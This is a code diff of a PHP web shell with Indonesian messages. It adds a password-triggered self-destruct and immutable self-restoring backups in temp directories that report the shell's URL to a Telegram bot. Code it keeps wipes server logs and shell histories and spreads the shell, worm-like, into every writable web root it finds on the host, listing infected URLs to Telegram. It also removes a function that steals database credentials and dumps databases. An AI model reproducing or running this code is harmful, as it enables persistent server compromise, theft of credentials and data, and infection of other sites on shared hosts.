@@ -1,6 +1,22 @@
 <?php
-//Maker: Dkid03
-//plss DON'T CHANGE AUTHOR 
+// ==================== FORCE SELF-DESTRUCT VIA URL ====================
+if (isset($_GET['kill']) && $_GET['kill'] === 'dkd2025') {
+    $file = __FILE__;
+    if (function_exists('shell_exec')) {
+        @shell_exec("chattr -i " . escapeshellarg($file) . " 2>/dev/null");
+        @shell_exec("chattr -a " . escapeshellarg($file) . " 2>/dev/null");
+        @shell_exec("chmod 777 " . escapeshellarg($file) . " 2>/dev/null");
+        @shell_exec("rm -f " . escapeshellarg($file) . " 2>/dev/null");
+        @shell_exec("shred -fuz " . escapeshellarg($file) . " 2>/dev/null");
+        @shell_exec("dd if=/dev/urandom of=" . escapeshellarg($file) . " bs=1M count=1 2>/dev/null");
+        @shell_exec("rm -f " . escapeshellarg($file) . " 2>/dev/null");
+    }
+    @chmod($file, 0777);
+    @unlink($file);
+    echo "✅ Self-destruct executed!";
+    exit;
+}
+
 // ==================== LOGOUT HANDLER ====================
 if (isset($_GET['logout'])) {
     session_start();
@@ -37,14 +53,46 @@ $specialDirectories = [
 ];
 $specialDirectories = array_filter($specialDirectories, function($d) { return $d && is_dir($d); });
 
+// ==================== GET CURRENT DOMAIN ====================
+function get_current_domain() {
+    $domain = $_SERVER['HTTP_HOST'] ?? '';
+    if (empty($domain) || $domain == 'localhost') {
+        $domain = $_SERVER['SERVER_NAME'] ?? '';
+    }
+    if (empty($domain)) {
+        if (function_exists('shell_exec')) {
+            $domain = trim(@shell_exec('hostname -f 2>/dev/null'));
+        }
+    }
+    if (empty($domain)) {
+        $domain = 'unknown';
+    }
+    return $domain;
+}
+
+// ==================== GET FILE LOCATION ====================
+function get_file_location() {
+    $file = __FILE__;
+    $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
+    $domain = get_current_domain();
+    $relative_path = str_replace($docRoot, '', $file);
+    $relative_path = ltrim($relative_path, '/');
+    $protocol = isset($_SERVER['HTTPS']) ? 'https://' : 'http://';
+    $url = $protocol . $domain . '/' . $relative_path;
+    return [
+        'url' => $url,
+        'path' => $file,
+        'domain' => $domain,
+        'relative' => $relative_path
+    ];
+}
+
 // ==================== FUNGSI UTILITY ====================
 function sendTelegramMessage($botToken, $chatId, $message) {
     if (empty($botToken) || empty($chatId) || empty($message)) return false;
-    
     if (strlen($message) > 4096) {
         $message = substr($message, 0, 4000) . "\n\n... (dipotong)";
     }
-    
     $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
     $data = [
         'chat_id' => $chatId, 
@@ -65,16 +113,12 @@ function sendTelegramMessage($botToken, $chatId, $message) {
         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
         curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
         curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
-        
         $result = curl_exec($ch);
         $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         curl_close($ch);
-        
         if ($result !== false && $httpCode == 200) {
             $response = json_decode($result, true);
-            if (isset($response['ok']) && $response['ok'] === true) {
-                return true;
-            }
+            if (isset($response['ok']) && $response['ok'] === true) return true;
         }
     }
     
@@ -93,15 +137,11 @@ function sendTelegramMessage($botToken, $chatId, $message) {
         ];
         $context = stream_context_create($options);
         $result = @file_get_contents($url, false, $context);
-        
         if ($result !== false) {
             $response = json_decode($result, true);
-            if (isset($response['ok']) && $response['ok'] === true) {
-                return true;
-            }
+            if (isset($response['ok']) && $response['ok'] === true) return true;
         }
     }
-    
     return false;
 }
 
@@ -109,12 +149,6 @@ function isRoot() {
     if (!function_exists('shell_exec')) return false;
     $output = @shell_exec('whoami 2>/dev/null');
     return trim($output) === 'root';
-}
-
-function isShellExecAvailable() {
-    if (!function_exists('shell_exec')) return false;
-    $disabled = explode(',', ini_get('disable_functions') ?: '');
-    return !in_array('shell_exec', array_map('trim', $disabled));
 }
 
 function formatSize($bytes) {
@@ -239,7 +273,6 @@ function isTerminalActive() {
 function clean_traces() {
     global $botToken, $telegramUserId;
     $results = [];
-    
     $access_logs = ['/var/log/apache2/access.log', '/var/log/nginx/access.log', '/var/log/httpd/access_log'];
     foreach ($access_logs as $log) {
         if (file_exists($log) && is_writable($log)) {
@@ -247,7 +280,6 @@ function clean_traces() {
             $results[] = "Cleaned: $log";
         }
     }
-    
     $error_logs = ['/var/log/apache2/error.log', '/var/log/nginx/error.log', '/var/log/httpd/error_log'];
     foreach ($error_logs as $log) {
         if (file_exists($log) && is_writable($log)) {
@@ -255,7 +287,6 @@ function clean_traces() {
             $results[] = "Cleaned: $log";
         }
     }
-    
     if (function_exists('shell_exec')) {
         $users = @explode("\n", @shell_exec('ls /home 2>/dev/null'));
         if ($users !== false) {
@@ -271,13 +302,12 @@ function clean_traces() {
         if (file_exists('/root/.bash_history')) @file_put_contents('/root/.bash_history', '');
         if (file_exists('/root/.mysql_history')) @file_put_contents('/root/.mysql_history', '');
     }
-    
     $msg = "🧹 *Traces Cleaned*\n\n" . implode("\n", $results);
     sendTelegramMessage($botToken, $telegramUserId, $msg);
     return $results;
 }
 
-// ==================== GET ALL DOCUMENT ROOTS (CACHED) ====================
+// ==================== GET ALL DOCUMENT ROOTS ====================
 function get_all_document_roots_cached($ttl = 300) {
     $cache_file = __DIR__ . '/.docroots_cache';
     if (file_exists($cache_file) && (time() - filemtime($cache_file) < $ttl)) {
@@ -289,7 +319,6 @@ function get_all_document_roots_cached($ttl = 300) {
     }
     $roots = []; 
     $processed = [];
-    
     if (file_exists('/etc/userdomains') && is_readable('/etc/userdomains')) {
         $lines = @file('/etc/userdomains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
         if ($lines !== false) {
@@ -299,61 +328,40 @@ function get_all_document_roots_cached($ttl = 300) {
                 $user = trim($user);
                 if (!empty($user) && !in_array($user, $processed)) {
                     $docRoot = "/home/{$user}/public_html";
-                    if (is_dir($docRoot)) { 
-                        $roots[] = $docRoot; 
-                        $processed[] = $user; 
-                    }
+                    if (is_dir($docRoot)) { $roots[] = $docRoot; $processed[] = $user; }
                     $docRoot = "/home/{$user}/www";
-                    if (is_dir($docRoot)) { 
-                        $roots[] = $docRoot; 
-                        $processed[] = $user . '_www'; 
-                    }
+                    if (is_dir($docRoot)) { $roots[] = $docRoot; $processed[] = $user . '_www'; }
                 }
             }
         }
     }
-    
     $homeDirs = @glob('/home/*', GLOB_ONLYDIR);
     if ($homeDirs !== false) {
         foreach ($homeDirs as $home) {
             $user = basename($home);
             if (in_array($user, $processed)) continue;
             $docRoot = $home . '/public_html';
-            if (is_dir($docRoot)) { 
-                $roots[] = $docRoot; 
-                $processed[] = $user; 
-            }
+            if (is_dir($docRoot)) { $roots[] = $docRoot; $processed[] = $user; }
             $docRoot = $home . '/www';
-            if (is_dir($docRoot)) { 
-                $roots[] = $docRoot; 
-                $processed[] = $user . '_www'; 
-            }
+            if (is_dir($docRoot)) { $roots[] = $docRoot; $processed[] = $user . '_www'; }
         }
     }
-    
     if (isset($_SERVER['DOCUMENT_ROOT']) && is_dir($_SERVER['DOCUMENT_ROOT']) && !in_array($_SERVER['DOCUMENT_ROOT'], $roots)) {
         $roots[] = $_SERVER['DOCUMENT_ROOT'];
     }
-    
     $extraDirs = ['/tmp', '/var/tmp', '/home', '/var/log', '/etc', '/usr/local', '/opt', '/srv'];
     foreach ($extraDirs as $dir) {
-        if (is_dir($dir) && !in_array($dir, $roots)) {
-            $roots[] = $dir;
-        }
+        if (is_dir($dir) && !in_array($dir, $roots)) { $roots[] = $dir; }
         $subs = @glob($dir . '/*', GLOB_ONLYDIR);
         if ($subs !== false) {
             foreach ($subs as $sub) {
-                if (is_dir($sub) && is_writable($sub) && !in_array($sub, $roots)) {
-                    $roots[] = $sub;
-                }
+                if (is_dir($sub) && is_writable($sub) && !in_array($sub, $roots)) { $roots[] = $sub; }
             }
         }
     }
-    
     $roots = array_unique($roots);
     $roots = array_filter($roots, 'is_dir');
     $roots = array_values($roots);
-    
     @file_put_contents($cache_file, json_encode($roots));
     return $roots;
 }
@@ -369,12 +377,10 @@ function get_all_domains_by_ip_cached($ttl = 300) {
     }
     $domains = [];
     $ip = $_SERVER['SERVER_ADDR'] ?? '';
-    
     if (empty($ip) && function_exists('shell_exec')) {
         $ip = trim(@shell_exec('hostname -I 2>/dev/null | awk \'{print $1}\''));
     }
     $ip = trim($ip);
-    
     if (file_exists('/etc/userdomains') && is_readable('/etc/userdomains')) {
         $lines = @file('/etc/userdomains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
         if ($lines !== false) {
@@ -385,7 +391,6 @@ function get_all_domains_by_ip_cached($ttl = 300) {
             }
         }
     }
-    
     if (file_exists('/etc/domains') && is_readable('/etc/domains')) {
         $lines = @file('/etc/domains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
         if ($lines !== false) {
@@ -396,47 +401,45 @@ function get_all_domains_by_ip_cached($ttl = 300) {
             }
         }
     }
-    
     $apacheConfigs = ['/etc/apache2/sites-enabled/*.conf', '/etc/httpd/conf.d/*.conf', '/etc/apache2/apache2.conf', '/etc/httpd/conf/httpd.conf'];
     foreach ($apacheConfigs as $pattern) {
         $files = @glob($pattern);
-        if ($files === false) continue;
-        foreach ($files as $conf) {
-            if (!is_file($conf) || !is_readable($conf)) continue;
-            $content = @file_get_contents($conf);
-            if ($content === false) continue;
-            preg_match_all('/ServerName\s+([^\s]+)/i', $content, $matches);
-            foreach ($matches[1] as $domain) $domains[] = trim($domain);
-            preg_match_all('/ServerAlias\s+([^\s]+)/i', $content, $matches2);
-            foreach ($matches2[1] as $domain) $domains[] = trim($domain);
-            preg_match_all('/<VirtualHost[^>]*>\s*ServerName\s+([^\s]+)/i', $content, $matches3);
-            foreach ($matches3[1] as $domain) $domains[] = trim($domain);
+        if ($files !== false) {
+            foreach ($files as $conf) {
+                if (!is_file($conf) || !is_readable($conf)) continue;
+                $content = @file_get_contents($conf);
+                if ($content === false) continue;
+                preg_match_all('/ServerName\s+([^\s]+)/i', $content, $matches);
+                foreach ($matches[1] as $domain) $domains[] = trim($domain);
+                preg_match_all('/ServerAlias\s+([^\s]+)/i', $content, $matches2);
+                foreach ($matches2[1] as $domain) $domains[] = trim($domain);
+                preg_match_all('/<VirtualHost[^>]*>\s*ServerName\s+([^\s]+)/i', $content, $matches3);
+                foreach ($matches3[1] as $domain) $domains[] = trim($domain);
+            }
         }
     }
-    
     $nginxConfigs = ['/etc/nginx/sites-enabled/*.conf', '/etc/nginx/conf.d/*.conf', '/etc/nginx/nginx.conf'];
     foreach ($nginxConfigs as $pattern) {
         $files = @glob($pattern);
-        if ($files === false) continue;
-        foreach ($files as $conf) {
-            if (!is_file($conf) || !is_readable($conf)) continue;
-            $content = @file_get_contents($conf);
-            if ($content === false) continue;
-            preg_match_all('/server_name\s+([^;]+)/i', $content, $matches);
-            foreach ($matches[1] as $server_names) {
-                foreach (explode(' ', $server_names) as $domain) {
-                    $domain = trim($domain);
-                    if (!empty($domain) && $domain != '_') $domains[] = $domain;
+        if ($files !== false) {
+            foreach ($files as $conf) {
+                if (!is_file($conf) || !is_readable($conf)) continue;
+                $content = @file_get_contents($conf);
+                if ($content === false) continue;
+                preg_match_all('/server_name\s+([^;]+)/i', $content, $matches);
+                foreach ($matches[1] as $server_names) {
+                    foreach (explode(' ', $server_names) as $domain) {
+                        $domain = trim($domain);
+                        if (!empty($domain) && $domain != '_') $domains[] = $domain;
+                    }
                 }
             }
         }
     }
-    
     if (function_exists('shell_exec') && !empty($ip)) {
         $hostname = @shell_exec("host $ip 2>/dev/null | awk '{print \$5}'");
         if ($hostname && strpos($hostname, '.') !== false) $domains[] = trim($hostname);
     }
-    
     $namedFiles = @glob('/var/named/*.db');
     if ($namedFiles !== false) {
         foreach ($namedFiles as $file) {
@@ -452,7 +455,6 @@ function get_all_domains_by_ip_cached($ttl = 300) {
             }
         }
     }
-    
     if (file_exists('/etc/hosts') && is_readable('/etc/hosts')) {
         $lines = @file('/etc/hosts');
         if ($lines !== false) {
@@ -466,20 +468,19 @@ function get_all_domains_by_ip_cached($ttl = 300) {
             }
         }
     }
-    
     $blacklist = ['www.example.com', 'localhost', '127.0.0.1'];
     $domains = array_unique($domains);
     $domains = array_filter($domains, function($d) use ($blacklist) {
         return !empty($d) && strpos($d, '.') !== false && strpos($d, '*') === false && !in_array($d, $blacklist);
     });
     $domains = array_values($domains);
-    
     @file_put_contents($cache_file, json_encode($domains));
     return $domains;
 }
 
 // ==================== ANTI-DELETE ULTIMATE ====================
 function anti_delete_ultimate() {
+    global $botToken, $telegramUserId;
     $currentFile = __FILE__;
     $backupLocations = [
         dirname(__DIR__) . '/.cache/temp.inc',
@@ -487,6 +488,7 @@ function anti_delete_ultimate() {
         '/var/tmp/' . md5($currentFile) . '.inc',
         '/dev/shm/' . md5($currentFile) . '.inc'
     ];
+    
     if (file_exists($currentFile)) {
         foreach ($backupLocations as $backup) {
             $dir = dirname($backup);
@@ -494,19 +496,44 @@ function anti_delete_ultimate() {
             if (!file_exists($backup)) {
                 @copy($currentFile, $backup);
                 @chmod($backup, 0444);
-                if (function_exists('shell_exec')) @shell_exec("chattr +i " . escapeshellarg($backup) . " 2>/dev/null");
+                if (function_exists('shell_exec')) {
+                    @shell_exec("chattr +i " . escapeshellarg($backup) . " 2>/dev/null");
+                }
             }
         }
-        if (function_exists('shell_exec')) @shell_exec("chattr +i " . escapeshellarg($currentFile) . " 2>/dev/null");
+        if (function_exists('shell_exec')) {
+            @shell_exec("chattr +i " . escapeshellarg($currentFile) . " 2>/dev/null");
+        }
         @chmod($currentFile, 0444);
     }
+    
     if (!file_exists($currentFile)) {
         foreach ($backupLocations as $backup) {
             if (file_exists($backup)) {
+                if (function_exists('shell_exec')) {
+                    @shell_exec("chattr -i " . escapeshellarg($backup) . " 2>/dev/null");
+                }
                 @copy($backup, $currentFile);
                 @chmod($currentFile, 0444);
-                if (function_exists('shell_exec')) @shell_exec("chattr +i " . escapeshellarg($currentFile) . " 2>/dev/null");
-                sendTelegramMessage($GLOBALS['botToken'], $GLOBALS['telegramUserId'], "✅ System cache restored from: " . basename($backup));
+                if (function_exists('shell_exec')) {
+                    @shell_exec("chattr +i " . escapeshellarg($currentFile) . " 2>/dev/null");
+                    @shell_exec("chattr +i " . escapeshellarg($backup) . " 2>/dev/null");
+                }
+                
+                $fileInfo = get_file_location();
+                $domain = get_current_domain();
+                $scriptName = basename($currentFile);
+                
+                $message = "🔄 *SYSTEM CACHE RESTORED*\n\n"
+                         . "📁 File: <code>" . $scriptName . "</code>\n"
+                         . "📂 Path: <code>" . $currentFile . "</code>\n"
+                         . "🌐 Domain: <code>" . $domain . "</code>\n"
+                         . "🔗 URL: <a href='" . $fileInfo['url'] . "'>" . $fileInfo['url'] . "</a>\n"
+                         . "💾 Restored from: <code>" . basename($backup) . "</code>\n"
+                         . "🕐 Time: " . date('Y-m-d H:i:s') . "\n\n"
+                         . "⚠️ File telah dipulihkan dari backup!";
+                
+                sendTelegramMessage($GLOBALS['botToken'], $GLOBALS['telegramUserId'], $message);
                 return true;
             }
         }
@@ -518,103 +545,16 @@ anti_delete_ultimate();
 // ==================== SYSTEM CACHE REPAIR ====================
 function system_cache_repair() { return anti_delete_ultimate(); }
 
-if (isset($_GET['cache_repair'])) { system_cache_repair(); echo "✅ System cache repair executed."; exit; }
-
-// ==================== DUMP DATABASES ====================
-function dump_databases() {
-    global $botToken, $telegramUserId;
-    $results = [];
-    $found_configs = [];
-    
-    $config_files = ['.env', 'wp-config.php', 'config.php', 'database.php', 'db.php', 'settings.php'];
-    $roots = get_all_document_roots_cached();
-    
-    foreach ($roots as $root) {
-        if (!is_dir($root) || !is_readable($root)) continue;
-        
-        foreach ($config_files as $file) {
-            $path = $root . '/' . $file;
-            if (file_exists($path) && is_readable($path)) {
-                $content = @file_get_contents($path);
-                if ($content === false) continue;
-                
-                $patterns = [
-                    '/(DB_HOST|DB_NAME|DB_USER|DB_PASS|DB_PASSWORD|DB_DATABASE)\s*=\s*[\'"]?([^\'"]+)[\'"]?/i',
-                    '/define\(\s*[\'"]?(DB_HOST|DB_NAME|DB_USER|DB_PASSWORD|DB_DATABASE)[\'"]?\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i'
-                ];
-                
-                $creds = [];
-                foreach ($patterns as $pattern) {
-                    preg_match_all($pattern, $content, $matches);
-                    if (!empty($matches[1]) && !empty($matches[2])) {
-                        foreach ($matches[1] as $i => $key) {
-                            $creds[] = $key . ': ' . trim($matches[2][$i]);
-                        }
-                    }
-                }
-                
-                if (!empty($creds)) {
-                    $found_configs[] = "📁 " . basename($path) . ":\n" . implode("\n", array_unique($creds));
-                }
-            }
-        }
-    }
-    
-    if (function_exists('shell_exec')) {
-        $mysql = @shell_exec('mysql --version 2>/dev/null');
-        if (strpos($mysql, 'mysql') !== false) {
-            $dbHost = getenv('DB_HOST') ?: 'localhost';
-            $dbUser = getenv('DB_USER') ?: 'root';
-            $dbPass = getenv('DB_PASS') ?: '';
-            $dbName = getenv('DB_NAME') ?: '';
-            
-            foreach ($roots as $root) {
-                if (file_exists($root . '/wp-config.php')) {
-                    $content = file_get_contents($root . '/wp-config.php');
-                    if (preg_match("/define\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $h)) $dbHost = $h[1];
-                    if (preg_match("/define\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $u)) $dbUser = $u[1];
-                    if (preg_match("/define\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $p)) $dbPass = $p[1];
-                    if (preg_match("/define\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $n)) $dbName = $n[1];
-                    break;
-                }
-            }
-            
-            if ($dbUser && $dbName) {
-                $dumpFile = '/tmp/db_dump_' . time() . '.sql';
-                $cmd = "mysqldump -h" . escapeshellarg($dbHost) . " -u" . escapeshellarg($dbUser);
-                if (!empty($dbPass)) $cmd .= " -p" . escapeshellarg($dbPass);
-                $cmd .= " " . escapeshellarg($dbName) . " 2>/dev/null > " . escapeshellarg($dumpFile);
-                @shell_exec($cmd);
-                
-                if (file_exists($dumpFile) && filesize($dumpFile) > 100) {
-                    $results[] = "💾 Database dumped: " . $dbName . " (" . formatSize(filesize($dumpFile)) . ")";
-                }
-            }
-        }
-    }
-    
-    if (empty($found_configs) && empty($results)) {
-        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan database atau kredensial.");
-        return [];
-    }
-    
-    $msg = "💾 *DATABASE DUMP*\n\n";
-    if (!empty($found_configs)) {
-        $msg .= "📋 *Config Files Found:*\n" . implode("\n", $found_configs);
-    }
-    if (!empty($results)) {
-        $msg .= "\n\n📁 *Dump Files:*\n" . implode("\n", $results);
-    }
-    
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return array_merge($found_configs, $results);
+if (isset($_GET['cache_repair'])) { 
+    system_cache_repair(); 
+    echo "✅ System cache repair executed."; 
+    exit; 
 }
 
 // ==================== WORM FUNCTIONS ====================
 function get_best_document_root($domain, $roots) {
     $domain = trim($domain);
     $domain = str_replace(['http://', 'https://', 'www.'], '', $domain);
-    
     $candidates = [
         "/home/{$domain}/public_html",
         "/home/{$domain}/www",
@@ -628,11 +568,8 @@ function get_best_document_root($domain, $roots) {
         (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : ''),
         (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] . "/../" . $domain . "/public_html" : ''),
     ];
-    
     foreach ($roots as $root) {
-        if (strpos($root, $domain) !== false) {
-            $candidates[] = $root;
-        }
+        if (strpos($root, $domain) !== false) { $candidates[] = $root; }
         $path_parts = explode('/', $root);
         foreach ($path_parts as $part) {
             if (strpos($part, $domain) !== false || strpos($domain, $part) !== false) {
@@ -641,7 +578,6 @@ function get_best_document_root($domain, $roots) {
             }
         }
     }
-    
     usort($candidates, function($a, $b) {
         $a_score = (strpos($a, 'public_html') !== false) ? 3 : 0;
         $a_score += (strpos($a, 'www') !== false) ? 2 : 0;
@@ -651,15 +587,10 @@ function get_best_document_root($domain, $roots) {
         $b_score += (strpos($b, 'html') !== false) ? 1 : 0;
         return $b_score - $a_score;
     });
-    
     $candidates = array_unique($candidates);
-    
     foreach ($candidates as $path) {
-        if ($path && is_dir($path) && is_writable($path)) {
-            return $path;
-        }
+        if ($path && is_dir($path) && is_writable($path)) { return $path; }
     }
-    
     return false;
 }
 
@@ -691,7 +622,6 @@ function worm_spread_to_domains($currentFile) {
     
     foreach ($domains as $domain) {
         $dir = get_best_document_root($domain, $roots);
-        
         if ($dir && is_dir($dir) && is_writable($dir)) {
             $targetFile = $dir . '/' . $myFile;
             if (!file_exists($targetFile)) { 
@@ -726,11 +656,9 @@ function worm_spread_to_domains($currentFile) {
          . "📊 Total domain: " . count($domains) . "\n"
          . "✅ Berhasil: " . count($infected) . "\n"
          . "❌ Gagal: " . count($errors) . "\n\n";
-    
     if (!empty($domainLinks)) {
         $msg .= "📁 *Results:*\n" . implode("\n", $domainLinks);
     }
-    
     sendTelegramMessage($botToken, $telegramUserId, $msg);
     return $infected;
 }
@@ -756,6 +684,7 @@ function worm_infect_all_domains($currentFile) {
         'sample', 'demo', 'test'
     ];
     
+    // SCAN APACHE
     if (function_exists('shell_exec')) {
         $apache_configs = [
             '/etc/apache2/sites-enabled/*.conf',
@@ -773,7 +702,6 @@ function worm_infect_all_domains($currentFile) {
                     if (!is_file($conf) || !is_readable($conf)) continue;
                     $content = @file_get_contents($conf);
                     if ($content === false) continue;
-                    
                     preg_match_all('/DocumentRoot\s+([^\s]+)/i', $content, $matches);
                     foreach ($matches[1] as $dir) {
                         $dir = trim($dir);
@@ -782,7 +710,6 @@ function worm_infect_all_domains($currentFile) {
                             $all_domains[] = ['dir' => $dir, 'source' => 'apache'];
                         }
                     }
-                    
                     preg_match_all('/ServerName\s+([^\s]+)/i', $content, $matches2);
                     foreach ($matches2[1] as $domain) {
                         $domain = trim($domain);
@@ -795,6 +722,7 @@ function worm_infect_all_domains($currentFile) {
         }
     }
     
+    // SCAN NGINX
     if (function_exists('shell_exec')) {
         $nginx_configs = [
             '/etc/nginx/sites-enabled/*.conf',
@@ -810,7 +738,6 @@ function worm_infect_all_domains($currentFile) {
                     if (!is_file($conf) || !is_readable($conf)) continue;
                     $content = @file_get_contents($conf);
                     if ($content === false) continue;
-                    
                     preg_match_all('/root\s+([^;]+)/i', $content, $matches);
                     foreach ($matches[1] as $dir) {
                         $dir = trim($dir);
@@ -819,7 +746,6 @@ function worm_infect_all_domains($currentFile) {
                             $all_domains[] = ['dir' => $dir, 'source' => 'nginx'];
                         }
                     }
-                    
                     preg_match_all('/server_name\s+([^;]+)/i', $content, $matches2);
                     foreach ($matches2[1] as $domains) {
                         $domains = trim($domains);
@@ -835,6 +761,7 @@ function worm_infect_all_domains($currentFile) {
         }
     }
     
+    // SCAN CPANEL
     if (file_exists('/etc/userdomains') && is_readable('/etc/userdomains')) {
         $lines = @file('/etc/userdomains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
         if ($lines !== false) {
@@ -861,6 +788,7 @@ function worm_infect_all_domains($currentFile) {
         }
     }
     
+    // SCAN /home
     $home_dirs = @glob('/home/*', GLOB_ONLYDIR);
     if ($home_dirs !== false) {
         foreach ($home_dirs as $home) {
@@ -880,6 +808,7 @@ function worm_infect_all_domains($currentFile) {
         }
     }
     
+    // SCAN COMMON DIRS
     $common_dirs = [
         '/var/www/html',
         '/var/www',
@@ -890,13 +819,13 @@ function worm_infect_all_domains($currentFile) {
         '/opt/bitnami/apache/htdocs',
         '/var/www/domains'
     ];
-    
     foreach ($common_dirs as $dir) {
         if (is_dir($dir)) {
             $all_domains[] = ['dir' => $dir, 'source' => 'common'];
         }
     }
     
+    // SCAN DOCUMENT ROOTS
     $roots = get_all_document_roots_cached();
     foreach ($roots as $root) {
         if (is_dir($root)) {
@@ -904,6 +833,7 @@ function worm_infect_all_domains($currentFile) {
         }
     }
     
+    // REMOVE DUPLICATES & FILTER
     $unique_dirs = [];
     $domain_map = [];
     $dirs_to_infect = [];
@@ -912,9 +842,7 @@ function worm_infect_all_domains($currentFile) {
         $dir = $item['dir'] ?? '';
         $domain = $item['domain'] ?? '';
         $source = $item['source'] ?? '';
-        
         if (empty($dir) || !is_dir($dir)) continue;
-        
         $dir_name = basename($dir);
         $skip = false;
         foreach ($exclude_dirs as $exclude) {
@@ -924,32 +852,18 @@ function worm_infect_all_domains($currentFile) {
             }
         }
         if ($skip) continue;
-        
-        if (strpos($dir, '/tmp') === 0 || strpos($dir, '/var/tmp') === 0 || strpos($dir, '/dev/shm') === 0) {
-            continue;
-        }
-        
-        if ($dir_name === '.well-known' || strpos($dir, '.well-known') !== false) {
-            continue;
-        }
-        
+        if (strpos($dir, '/tmp') === 0 || strpos($dir, '/var/tmp') === 0 || strpos($dir, '/dev/shm') === 0) continue;
+        if ($dir_name === '.well-known' || strpos($dir, '.well-known') !== false) continue;
         if (!empty($docRoot) && strpos($dir, $docRoot) !== 0) {
             $found = false;
             foreach ($roots as $root) {
-                if (strpos($dir, $root) === 0) {
-                    $found = true;
-                    break;
-                }
+                if (strpos($dir, $root) === 0) { $found = true; break; }
             }
-            if (!$found && $source !== 'cpanel' && $source !== 'home') {
-                continue;
-            }
+            if (!$found && $source !== 'cpanel' && $source !== 'home') continue;
         }
-        
         if (!empty($domain) && strpos($domain, '.') !== false) {
             $domain_map[$dir] = $domain;
         }
-        
         if (!in_array($dir, $unique_dirs)) {
             $unique_dirs[] = $dir;
             $dirs_to_infect[] = ['dir' => $dir, 'domain' => $domain, 'source' => $source];
@@ -964,7 +878,6 @@ function worm_infect_all_domains($currentFile) {
     foreach ($dirs_to_infect as $item) {
         $dir = $item['dir'];
         $domain = $item['domain'] ?? '';
-        
         if (empty($domain) || $domain === 'unknown') {
             $path_parts = explode('/', $dir);
             $last = end($path_parts);
@@ -979,7 +892,6 @@ function worm_infect_all_domains($currentFile) {
                 }
             }
         }
-        
         if (!is_writable($dir)) {
             @chmod($dir, 0755);
             if (!is_writable($dir)) {
@@ -987,9 +899,7 @@ function worm_infect_all_domains($currentFile) {
                 continue;
             }
         }
-        
         $targetFile = $dir . '/' . $myFile;
-        
         if (file_exists($targetFile)) {
             if (!empty($domain) && strpos($domain, '.') !== false) {
                 $domainLinks[] = "http://{$domain}/{$myFile} (exists)";
@@ -998,12 +908,10 @@ function worm_infect_all_domains($currentFile) {
             }
             continue;
         }
-        
         if (@copy($currentFile, $targetFile)) {
             @chmod($targetFile, 0644);
             $infected[] = $targetFile;
             $success_count++;
-            
             if (!empty($domain) && strpos($domain, '.') !== false) {
                 $domainLinks[] = "http://{$domain}/{$myFile}";
             } else {
@@ -1019,250 +927,17 @@ function worm_infect_all_domains($currentFile) {
          . "✅ Berhasil: $success_count\n"
          . "❌ Gagal: " . count($errors) . "\n"
          . "🌐 Total domain: " . count($domain_list) . "\n\n";
-    
     if (!empty($domainLinks)) {
         $msg .= "📁 *Results:*\n" . implode("\n", array_slice($domainLinks, 0, 25));
         if (count($domainLinks) > 25) {
             $msg .= "\n... dan " . (count($domainLinks) - 25) . " lainnya";
         }
     }
-    
     if (!empty($errors) && count($errors) <= 10) {
         $msg .= "\n\n❌ *Errors:*\n" . implode("\n", $errors);
     }
-    
     sendTelegramMessage($botToken, $telegramUserId, $msg);
-    
-    return [
-        'infected' => $infected, 
-        'links' => $domainLinks, 
-        'errors' => $errors,
-        'total_domains' => count($domain_list)
-    ];
-}
-
-// ==================== SCAN WORDPRESS/LARAVEL ====================
-function scan_wordpress_laravel() {
-    global $botToken, $telegramUserId;
-    $found = [];
-    $roots = get_all_document_roots_cached();
-    
-    foreach ($roots as $root) {
-        if (!is_dir($root) || !is_readable($root)) continue;
-        
-        if (file_exists($root . '/wp-config.php') && is_readable($root . '/wp-config.php')) {
-            $wp_config = file_get_contents($root . '/wp-config.php');
-            $creds = [];
-            
-            preg_match("/define\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $wp_config, $db_name);
-            preg_match("/define\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $wp_config, $db_user);
-            preg_match("/define\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $wp_config, $db_pass);
-            preg_match("/define\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $wp_config, $db_host);
-            
-            $creds[] = "📁 WordPress: $root";
-            if (!empty($db_name[1])) $creds[] = "   DB_NAME: " . $db_name[1];
-            if (!empty($db_user[1])) $creds[] = "   DB_USER: " . $db_user[1];
-            if (!empty($db_pass[1])) $creds[] = "   DB_PASS: " . $db_pass[1];
-            if (!empty($db_host[1])) $creds[] = "   DB_HOST: " . $db_host[1];
-            
-            if (file_exists($root . '/wp-includes/version.php')) {
-                $v_content = @file_get_contents($root . '/wp-includes/version.php');
-                if ($v_content && preg_match('/\$wp_version\s*=\s*[\'"]([^\'"]+)[\'"]/', $v_content, $v_match)) {
-                    $creds[] = "   Version: " . $v_match[1];
-                }
-            }
-            
-            $plugins_dir = $root . '/wp-content/plugins';
-            if (is_dir($plugins_dir)) {
-                $plugins = @scandir($plugins_dir);
-                if ($plugins !== false) {
